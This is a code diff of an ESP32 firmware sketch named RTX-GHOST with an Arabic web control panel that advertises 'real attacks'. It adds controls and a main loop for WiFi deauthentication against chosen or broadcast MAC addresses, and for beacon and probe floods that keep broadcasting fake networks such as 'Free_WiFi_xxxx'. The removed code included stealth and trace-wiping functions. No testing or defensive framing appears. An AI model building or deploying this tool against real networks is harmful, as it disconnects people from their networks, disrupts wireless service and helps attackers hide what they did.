-            <div class="status-card info" id="statusClients">
-                <span class="indicator indicator-online"></span>
-                <strong>الاتصالات:</strong> <span id="clientsCount">0</span>
-            </div>
-        </div>
-        
-        <div class="settings-panel">
-            <select id="themeSelect" class="btn btn-sm">
-                <option value="dark">🌙 الوضع المظلم</option>
-                <option value="light">☀️ الوضع الفاتح</option>
-            </select>
-            
-            <select id="languageSelect" class="btn btn-sm">
-                <option value="ar">🈳 العربية</option>
-                <option value="en">🈴 English</option>
-            </select>
-            
-            <button class="btn btn-sm" onclick="toggleTextSize()" id="textSizeBtn">
-                🔍 تكبير النص
-            </button>
-            
-            <button class="btn btn-sm btn-info" onclick="refreshStatus()">
-                🔄 تحديث
-            </button>
+            <h1>🕵️‍♂️ نظام RTX-GHOST - هجمات حقيقية</h1>
+            <p>هجمات WiFi حقيقية على ESP32</p>
         </div>
         
         <div class="grid">
-            <!-- بطاقة هجمات الشبكات -->
+            <!-- بطاقة هجمات Deauth -->
             <div class="card">
-                <h2>📡 هجمات الشبكات اللاسلكية</h2>
-                <div class="control-group">
-                    <label>هجمات WiFi:</label>
-                    <button class="btn btn-sm btn-danger" onclick="startAttack('wifi_deauth', 'all')">
-                        🎯 هجوم Deauth
-                    </button>
-                    <button class="btn btn-sm btn-warning" onclick="startAttack('wifi_spoof', '')">
-                        🎭 انتحال شبكات
-                    </button>
-                    <button class="btn btn-sm btn-info" onclick="startNetworkScan()">
-                        🔍 مسح الشبكات
-                    </button>
+                <h2>🎯 هجوم Deauth الحقيقي</h2>
+                <div class="form-group">
+                    <label>عنوان الهدف (MAC):</label>
+                    <input type="text" class="form-control" id="deauthTarget" placeholder="FF:FF:FF:FF:FF:FF للجميع">
                 </div>
-                
-                <div class="control-group">
-                    <label>تصنت الحزم:</label>
-                    <button class="btn btn-sm btn-info" onclick="startAttack('packet_sniff', '')">
-                        📡 اعتراض البيانات
-                    </button>
+                <div class="form-group">
+                    <label>عدد الحزم:</label>
+                    <input type="number" class="form-control" id="deauthCount" value="100">
                 </div>
-                
-                <div class="control-group">
-                    <label>إدارة الهجمات:</label>
-                    <button class="btn btn-sm" onclick="stopAllAttacks()">
-                        ⏹️ إيقاف الكل
-                    </button>
-                </div>
+                <button class="btn btn-danger" onclick="startDeauth()">
+                    🚀 بدء هجوم Deauth
+                </button>
             </div>
             
-            <!-- بطاقة هجمات البلوتوث -->
+            <!-- بطاقة هجمات Flood -->
             <div class="card">
-                <h2>📱 هجمات البلوتوث</h2>
-                <div class="control-group">
-                    <label>مسح الأجهزة:</label>
-                    <button class="btn btn-sm btn-info" onclick="startBluetoothScan()">
-                        📱 مسح البلوتوث
-                    </button>
-                    <button class="btn btn-sm btn-warning" onclick="startAttack('bluetooth_spoof', '')">
-                        🎭 انتحال أجهزة
-                    </button>
+                <h2>🌊 هجمات Flood الحقيقية</h2>
+                <div class="form-group">
+                    <label>هجوم Beacon Flood:</label>
+                    <input type="number" class="form-control" id="beaconCount" value="50" placeholder="عدد الإطارات">
                 </div>
+                <button class="btn btn-warning" onclick="startBeaconFlood()">
+                    📡 بدء Beacon Flood
+                </button>
                 
-                <div class="control-group">
-                    <label>هجمات متقدمة:</label>
-                    <button class="btn btn-sm btn-danger" onclick="showAdvancedBluetooth()">
-                        ⚡ هجمات متقدمة
-                    </button>
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>هجوم Probe Flood:</label>
+                    <input type="number" class="form-control" id="probeCount" value="100" placeholder="عدد الطلبات">
                 </div>
+                <button class="btn btn-warning" onclick="startProbeFlood()">
+                    🔍 بدء Probe Flood
+                </button>
             </div>
             
-            <!-- بطاقة نظام الأمان -->
+            <!-- بطاقة المسح -->
             <div class="card">
-                <h2>🛡️ نظام الأمان والتخفي</h2>
-                <div class="control-group">
-                    <label>وضع التخفي:</label>
-                    <button class="btn btn-sm" onclick="toggleStealth()" id="stealthBtn">
-                        👻 تفعيل التخفي
-                    </button>
-                </div>
-                
-                <div class="control-group">
-                    <label>محو الآثار:</label>
-                    <button class="btn btn-sm btn-warning" onclick="cleanTraces()">
-                        🧹 محو السجلات
-                    </button>
-                    <button class="btn btn-sm btn-danger" onclick="showDestructConfirm()">
-                        💥 تدمير آمن
-                    </button>
-                </div>
-                
-                <div class="control-group">
-                    <label>معلومات النظام:</label>
-                    <button class="btn btn-sm btn-info" onclick="showSystemInfo()">
-                        📊 معلومات مفصلة
-                    </button>
-                </div>
+                <h2>🔍 مسح الشبكات الحقيقي</h2>
+                <p>مسح فعلي للشبكات اللاسلكية القريبة</p>
+                <button class="btn" onclick="startNetworkScan()">
+                    📊 مسح الشبكات
+                </button>
+                <button class="btn" onclick="stopAllAttacks()" style="margin-top: 10px;">
+                    ⏹️ إيقاف جميع الهجمات
+                </button>
             </div>
             
-            <!-- بطاقة السجلات -->
+            <!-- بطاقة الحالة -->
             <div class="card">
-                <h2>📝 سجل الأحداث</h2>
-                <div class="log-container" id="logContainer">
-                    <!-- السجلات تظهر هنا -->
+                <h2>📊 حالة النظام</h2>
+                <div class="status-card">
+                    <span class="indicator" id="deauthIndicator"></span>
+                    <strong>هجوم Deauth:</strong> <span id="deauthStatus">متوقف</span>
                 </div>
-                <div style="margin-top: 15px;">
-                    <button class="btn btn-sm" onclick="clearLogs()">
-                        🗑️ مسح السجلات
-                    </button>
-                    <button class="btn btn-sm btn-info" onclick="refreshLogs()">
-                        🔄 تحديث السجلات
-                    </button>
+                <div class="status-card">
+                    <span class="indicator" id="beaconIndicator"></span>
+                    <strong>Beacon Flood:</strong> <span id="beaconStatus">متوقف</span>
                 </div>
+                <div class="status-card">
+                    <span class="indicator" id="probeIndicator"></span>
+                    <strong>Probe Flood:</strong> <span id="probeStatus">متوقف</span>
+                </div>
+                <div class="status-card">
+                    <strong>الحزم المرسلة:</strong> <span id="packetCount">0</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- سجلات النظام -->
+        <div class="card">
+            <h2>📝 سجل الأحداث الحية</h2>
+            <div class="log-container" id="logContainer">
+                <!-- السجلات تظهر هنا -->
             </div>
         </div>
     </div>
 
     <script>
         let ws;
-        let isConnected = false;
         
         // 🔄 الاتصال بـ WebSocket
         function connectWebSocket() {
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsUrl = protocol + '//' + window.location.hostname + ':81';
+            const wsUrl = 'ws://' + window.location.hostname + ':81';
             
             ws = new WebSocket(wsUrl);
             
             ws.onopen = function() {
-                isConnected = true;
-                addLog('🔌 متصل بنظام RTX-GHOST', 'system');
-                updateStatusIndicator(true);
+                addLog('🔌 متصل بنظام الهجمات الحقيقية', 'system');
             };
             
             ws.onmessage = function(event) {
@@ -897,52 +684,110 @@ public:
                     addLog(data.log, data.log_type);
                 } else if (data.type === 'status_update') {
                     updateStatusDisplay(data);
-                } else if (data.type === 'logs_update') {
-                    loadLogs(data.logs);
                 }
             };
             
             ws.onclose = function() {
-                isConnected = false;
-                addLog('🔌 انقطع الاتصال بالنظام', 'system');
-                updateStatusIndicator(false);
+                addLog('🔌 انقطع الاتصال، إعادة المحاولة...', 'system');
                 setTimeout(connectWebSocket, 3000);
             };
-            
-            ws.onerror = function(error) {
-                console.error('WebSocket error:', error);
-            };
         }
         
-        // 📊 تحديث عرض الحالة
+        // ⚔️ بدء الهجمات
+        function startDeauth() {
+            const target = document.getElementById('deauthTarget').value || 'FF:FF:FF:FF:FF:FF';
+            const count = document.getElementById('deauthCount').value;
+            
+            const formData = new FormData();
+            formData.append('target', target);
+            formData.append('count', count);
+            
+            fetch('/attack/deauth', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'started') {
+                      addLog('🎯 بدء هجوم Deauth حقيقي', 'attack');
+                  }
+              });
+        }
+        
+        function startBeaconFlood() {
+            const count = document.getElementById('beaconCount').value;
+            
+            const formData = new FormData();
+            formData.append('count', count);
+            
+            fetch('/attack/beacon', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'started') {
+                      addLog('🌊 بدء هجوم Beacon Flood حقيقي', 'attack');
+                  }
+              });
+        }
+        
+        function startProbeFlood() {
+            const count = document.getElementById('probeCount').value;
+            
+            const formData = new FormData();
+            formData.append('count', count);
+            
+            fetch('/attack/probe', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.status === 'started') {
+                      addLog('🔍 بدء هجوم Probe Flood حقيقي', 'attack');
+                  }
+              });
+        }
+        
+        function startNetworkScan() {
+            fetch('/scan/networks', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    addLog('📊 تم مسح ' + data.networks_found + ' شبكة', 'scan');
+                });
+        }
+        
+        function stopAllAttacks() {
+            fetch('/attack/stop', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'stopped') {
+                        addLog('⏹️ توقف جميع الهجمات', 'system');
+                    }
+                });
+        }
+        
+        // 📊 تحديث الحالة
         function updateStatusDisplay(data) {
-            document.getElementById('stealthStatus').textContent = 
-                data.stealth_mode ? 'نشط' : 'غير نشط';
-            document.getElementById('systemStatus').textContent = 
-                data.system_active ? 'نشط' : 'متوقف';
-            document.getElementById('attackStatus').textContent = 
-                data.attack_running ? 'نشط' : 'متوقف';
-            document.getElementById('clientsCount').textContent = 
-                data.connected_clients;
-                
-            // تحديث ألوان المؤشرات
-            updateStatusIndicator(true);
+            // تحديث حالة الهجمات
+            updateAttackStatus('deauth', data.deauth_active);
+            updateAttackStatus('beacon', data.beacon_active);
+            updateAttackStatus('probe', data.probe_active);
+            
+            // تحديث عدد الحزم
+            document.getElementById('packetCount').textContent = data.packet_count;
         }
         
-        function updateStatusIndicator(online) {
-            const indicators = {
-                statusStealth: online ? 'indicator-online' : 'indicator-offline',
-                statusSystem: online ? 'indicator-online' : 'indicator-offline',
-                statusAttack: document.getElementById('attackStatus').textContent === 'نشط' ? 
-                            'indicator-warning' : 'indicator-offline',
-                statusClients: online ? 'indicator-online' : 'indicator-offline'
-            };
+        function updateAttackStatus(type, isActive) {
+            const indicator = document.getElementById(type + 'Indicator');
+            const status = document.getElementById(type + 'Status');
             
-            for (const [id, className] of Object.entries(indicators)) {
-                const indicator = document.querySelector(`#${id} .indicator`);
-                if (indicator) {
-                    indicator.className = 'indicator ' + className;
-                }
+            if (isActive) {
+                indicator.className = 'indicator indicator-active';
+                status.textContent = 'نشط';
+                status.style.color = '#00ff88';
+            } else {
+                indicator.className = 'indicator indicator-inactive';
+                status.textContent = 'متوقف';
+                status.style.color = '#ff4444';
             }
         }
         
@@ -956,170 +801,16 @@ public:
             container.scrollTop = container.scrollHeight;
         }
         
-        function loadLogs(logs) {
-            const container = document.getElementById('logContainer');
-            container.innerHTML = '';
-            const logArray = logs.split('\n');
-            logArray.forEach(log => {
-                if (log.trim()) {
-                    const logEntry = document.createElement('div');
-                    logEntry.className = 'log-entry log-system';
-                    logEntry.textContent = log;
-                    container.appendChild(logEntry);
-                }
-            });
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        function clearLogs() {
-            document.getElementById('logContainer').innerHTML = '';
-        }
-        
-        function refreshLogs() {
-            fetch('/logs')
-                .then(response => response.json())
-                .then(data => loadLogs(data.logs));
-        }
-        
-        // ⚔️ إدارة الهجمات
-        function startAttack(type, target) {
-            const formData = new FormData();
-            formData.append('type', type);
-            formData.append('target', target);
-            
-            fetch('/attack/start', {
-                method: 'POST',
-                body: formData
-            }).then(response => response.json())
-              .then(data => {
-                  if (data.status === 'success') {
-                      addLog('✅ بدء الهجوم: ' + type, 'attack');
-                  }
-              });
-        }
-        
-        function stopAllAttacks() {
-            fetch('/attack/stop', { method: 'POST' })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === 'stopped') {
-                        addLog('⏹️ توقف جميع الهجمات', 'system');
-                    }
-                });
-        }
-        
-        function startNetworkScan() {
-            fetch('/scan/networks', { method: 'POST' })
-                .then(response => response.json())
-                .then(data => {
-                    addLog('📊 تم مسح الشبكات', 'scan');
-                });
-        }
-        
-        function startBluetoothScan() {
-            fetch('/scan/bluetooth', { method: 'POST' })
-                .then(response => response.json())
-                .then(data => {
-                    addLog('📱 تم مسح أجهزة البلوتوث', 'scan');
-                });
-        }
-        
-        // ⚙️ الإعدادات
-        function toggleStealth() {
-            fetch('/security/stealth', { method: 'POST' })
-                .then(response => response.json())
-                .then(data => {
-                    const btn = document.getElementById('stealthBtn');
-                    btn.textContent = data.stealth_mode ? '👻 تعطيل التخفي' : '👻 تفعيل التخفي';
-                });
-        }
-        
-        function cleanTraces() {
-            if (confirm('⚠️ هل تريد محو جميع الآثار؟')) {
-                fetch('/security/clean', { method: 'POST' })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.status === 'cleaned') {
-                            addLog('✅ تم محو جميع الآثار', 'system');
-                            clearLogs();
-                        }
-                    });
-            }
-        }
-        
-        // 🎨 إعدادات الواجهة
-        document.getElementById('themeSelect').addEventListener('change', function() {
-            updateSetting('theme', this.value);
-        });
-        
-        document.getElementById('languageSelect').addEventListener('change', function() {
-            updateSetting('language', this.value);
-        });
-        
-        function toggleTextSize() {
-            const btn = document.getElementById('textSizeBtn');
-            const current = btn.textContent.includes('تكبير');
-            updateSetting('largeText', !current);
-        }
-        
-        function updateSetting(key, value) {
-            const formData = new FormData();
-            formData.append(key, value);
-            
-            fetch('/settings/update', {
-                method: 'POST',
-                body: formData
-            }).then(() => location.reload());
-        }
-        
-        // 📊 معلومات النظام
-        function refreshStatus() {
-            fetch('/system/status')
-                .then(response => response.json())
-                .then(data => {
-                    updateStatusDisplay(data);
-                    addLog('🔄 تم تحديث حالة النظام', 'system');
-                });
-        }
-        
-        function showSystemInfo() {
-            fetch('/system/info')
-                .then(response => response.json())
-                .then(data => {
-                    const info = `
-🤖 معلومات النظام:
-• الموديل: ${data.chip_model}
-• تردد المعالج: ${data.cpu_freq} MHz
-• الذاكرة الحرة: ${data.free_heap} bytes
-• العملاء المتصلين: ${data.clients}
-• عنوان IP: ${data.ip}
-                    `;
-                    alert(info);
-                });
-        }
-        
-        // 💥 وظائف متقدمة
-        function showAdvancedBluetooth() {
-            alert('🚧 الميزات المتقدمة قيد التطوير...');
-        }
-        
-        function showDestructConfirm() {
-            if (confirm('💀 تحذير: هذا الإجراء لا يمكن التراجع عنه!\nهل تريد فعلاً التدمير الآمن؟')) {
-                addLog('⚠️ بدء التدمير الآمن...', 'system');
-                // يمكن إضافة استدعاء API للتدمير هنا
-            }
-        }
-        
         // 🚀 التهيئة
         document.addEventListener('DOMContentLoaded', function() {
             connectWebSocket();
-            refreshStatus();
-            refreshLogs();
             
-            // تعيين القيم الحالية للإعدادات
-            document.getElementById('themeSelect').value = ')raw" + currentTheme + R"raw(';
-            document.getElementById('languageSelect').value = ')raw" + language + R"raw(';
-            document.getElementById('textSizeBtn').textContent = ')raw" + (largeText ? "🔍 تصغير النص" : "🔍 تكبير النص") + R"raw(';
+            // تحديث الحالة كل 2 ثانية
+            setInterval(() => {
+                fetch('/system/status')
+                    .then(response => response.json())
+                    .then(data => updateStatusDisplay(data));
+            }, 2000);
         });
     </script>
 </body>
@@ -1128,12 +819,48 @@ public:
         
         return html;
     }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // 🔄 الحلقة الرئيسية
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    void run() {
+        server.handleClient();
+        webSocket.loop();
+        
+        // إرسال تحديثات دورية للحالة
+        static unsigned long lastUpdate = 0;
+        if (millis() - lastUpdate > 1000) {
+            lastUpdate = millis();
+            sendSystemStatus();
+        }
+        
+        // تنفيذ الهجمات النشطة
+        if (beaconFloodActive) {
+            // استمرار إرسال Beacon frames
+            static unsigned long lastBeacon = 0;
+            if (millis() - lastBeacon > 500) {
+                lastBeacon = millis();
+                String ssid = "Free_WiFi_" + String(random(1000, 9999));
+                sendBeaconFrame(ssid);
+            }
+        }
+        
+        if (probeFloodActive) {
+            // استمرار إرسال Probe requests
+            static unsigned long lastProbe = 0;
+            if (millis() - lastProbe > 200) {
+                lastProbe = millis();
+                String ssid = "Hidden_Net_" + String(random(1000, 9999));
+                sendProbeRequest(ssid);
+            }
+        }
+    }
 };
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // 🚀 إنشاء النظام
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-RTXGhostSystem rtx_system;
+RTXGhostRealAttacks rtx_system;
 
 void setup() {
     rtx_system.begin();
